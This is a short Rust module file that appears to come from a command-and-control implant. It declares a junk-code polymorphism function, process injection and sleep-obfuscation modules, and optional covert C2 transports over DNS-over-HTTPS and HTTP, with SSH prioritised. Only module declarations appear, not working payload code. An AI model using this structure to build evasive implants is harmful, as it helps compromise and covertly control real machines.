// Inserting some random junk compilation artifacts (FR-2)
pub fn polymorph() {
    junk_macro::insert_junk!();
}
pub mod injection;

pub mod obfuscated_sleep;

/// Optional covert transport modules.
///
/// `c2_doh` and `c2_http` are activated only when BOTH are true:
/// 1) the corresponding Cargo feature is compiled in, and
/// 2) the malleable profile enables that transport at runtime.
///
/// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
#[cfg(feature = "doh-transport")]
pub mod c2_doh;
#[cfg(feature = "http-transport")]
pub mod c2_http;
